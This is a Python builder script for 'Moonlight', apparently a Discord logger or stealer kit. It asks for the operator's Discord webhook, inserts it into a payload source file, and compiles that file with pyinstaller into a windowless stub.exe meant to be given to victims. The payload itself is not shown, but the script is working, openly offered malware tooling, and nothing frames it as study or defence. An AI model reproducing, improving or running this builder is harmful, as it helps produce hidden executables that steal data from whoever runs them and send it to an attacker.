from os import system, remove, getenv
from os.path import join, exists
from colorama import Fore, init
from shutil import rmtree, copy2
from string import ascii_letters
from random import choice


class Builder:
    def showLogo(self) -> None:
        print(f"""{Fore.MAGENTA}
███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗██╗     ██╗ ██████╗ ██╗  ██╗████████╗
████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║██║     ██║██╔════╝ ██║  ██║╚══██╔══╝
██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║██║     ██║██║  ███╗███████║   ██║   
██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║██║     ██║██║   ██║██╔══██║   ██║   
██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║███████╗██║╚██████╔╝██║  ██║   ██║   
╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
Moonlight V1 | Github URL: https://github.com/unnulled/moonlight-logger\n""".replace("█", f"{Fore.WHITE}█{Fore.MAGENTA}"))

    def buildSequence(self) -> None:
        system("cls")
        self.showLogo()
        webhook = input(
            f"{Fore.MAGENTA}[{Fore.WHITE}MOONLIGHT{Fore.MAGENTA}] Your Discord Webhook {Fore.WHITE}>{Fore.MAGENTA} ")
        buildId = ''.join(choice(ascii_letters) for i in range(10))
        srcFile = open("./src/payload.py", "r")
        srcCode = srcFile.read()
        updatedSrcCode = srcCode.replace("%WEBHOOK_URL%", webhook)
        srcFile.close()
        newSrcFilePath = join(self.TEMP, f"{buildId}.py")
        newSrcFile = open(newSrcFilePath, "w")
        newSrcFile.write(updatedSrcCode)
        newSrcFile.close()
        system(f"pyinstaller --onefile --noconsole {newSrcFilePath}")
        remove(f"{buildId}.spec")
        remove(newSrcFilePath)
        rmtree("build")
        if exists("stub.exe"):
            remove("stub.exe")
        copy2(f"./dist/{buildId}.exe", "./stub.exe")
        rmtree("dist")
        system("cls")
        print(
            f"Built successfully! Press {Fore.MAGENTA}[{Fore.WHITE}ENTER{Fore.MAGENTA}] to build another")
        input()

    def __init__(self) -> None:
        self.TEMP = getenv("TEMP")

        init()
        system("cls && title moonlight")

        while True:
            self.buildSequence()


Builder()
